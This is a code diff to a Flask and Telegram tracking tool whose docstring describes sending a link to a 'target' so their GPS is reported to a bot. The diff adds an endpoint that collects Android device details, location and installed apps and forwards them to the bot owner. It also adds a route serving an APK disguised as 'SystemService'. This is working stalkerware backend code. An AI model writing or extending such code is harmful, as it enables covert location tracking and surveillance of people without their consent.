@@ -5,6 +5,7 @@ Buat link → kirim ke target → target buka → GPS terkirim → notif ke bot
 """
 
 import os
+import json
 import sqlite3
 import hashlib
 import time
@@ -12,7 +13,7 @@ import asyncio
 import base64
 from io import BytesIO
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for, Response
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for, Response, send_file
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
@@ -37,6 +38,9 @@ def init_db():
     c.execute("""CREATE TABLE IF NOT EXISTS photos (
         id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
         photo BLOB, timestamp TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS android_reports (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT,
+        report_data TEXT, ip_address TEXT, timestamp TEXT)""")
     conn.commit()
     conn.close()
 
@@ -464,6 +468,85 @@ def api_dashboard():
         "latest_location": latest_location,
         "generated_at": now.strftime("%Y-%m-%d %H:%M:%S")
     })
+
+# ============ ANDROID APP ENDPOINTS ============
+@app.route("/api/android-report", methods=["POST"])
+def api_android_report():
+    """Endpoint for Android app to report device data"""
+    try:
+        data = request.get_json(silent=True) or {}
+        device_id = data.get("device_id", "unknown")
+        report_data = json.dumps(data)
+
+        ip_address = request.remote_addr or "0.0.0.0"
+        from datetime import datetime
+        db_exec("INSERT INTO android_reports (device_id, report_data, ip_address, timestamp) VALUES (?,?,?,?)",
+                (device_id, report_data, ip_address, datetime.now().isoformat()))
+
+        # Try to send to Telegram owner (first user)
+        owner = db_exec("SELECT DISTINCT created_by FROM links ORDER BY created_at ASC LIMIT 1")
+        if owner:
+            try:
+                from telegram import Bot
+                bot = Bot(token=BOT_TOKEN)
+                device = data.get("device", {})
+                loc = data.get("location", {})
+                summary = (
+                    f"📱 *Android Report*\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🆔 `{device_id[:12]}...`\n"
+                    f"📱 {device.get('manufacturer','?')} {device.get('model','?')}\n"
+                    f"🤖 Android {device.get('android_version','?')} (API {device.get('api_level','?')})\n"
+                    f"🔋 {data.get('battery',{}).get('percentage',0):.0f}%\n"
+                    f"📍 {loc.get('lat','?')}, {loc.get('lng','?')}\n"
+                    f"🕐 {datetime.fromtimestamp(data.get('timestamp',0)).strftime('%H:%M:%S')}\n"
+                )
+                apps = data.get("installed_apps", [])
+                if apps:
+                    summary += f"\n📦 *Apps* ({len(apps)}):\n"
+                    for app in apps[:10]:
+                        summary += f"• {app.get('name','?')}\n"
+                summary += f"\n━━━━━━━━━━━━━━━━━━━━\n📊 Dashboard → {BASE_URL}/dashboard"
+                kb = [[InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")]]
+                asyncio.run(bot.send_message(owner[0][0], summary,
+                    reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"))
+            except Exception as e:
+                print(f"Android notif error: {e}")
+
+        return jsonify({"success": True, "message": "Report received"})
+    except Exception as e:
+        print(f"Android report error: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+@app.route("/api/android-devices")
+def api_android_devices():
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT device_id, report_data, timestamp FROM android_reports ORDER BY id DESC LIMIT 50")
+    devices = []
+    for row in rows:
+        try:
+            data = json.loads(row[1])
+        except:
+            data = {}
+        devices.append({
+            "device_id": row[0],
+            "data": data,
+            "timestamp": row[2]
+        })
+    return jsonify({"devices": devices})
+
+
+@app.route("/apk/download")
+def apk_download():
+    """Download the Android APK"""
+    apk_path = "/root/droid-service/build/output/SystemService-v1.0.0.apk"
+    if os.path.exists(apk_path):
+        return send_file(apk_path, mimetype="application/vnd.android.package-archive",
+                         as_attachment=True, attachment_filename="SystemService-v1.0.0.apk")
+    return "APK not found", 404
+
 
 # ============ MAIN ============
 def main():
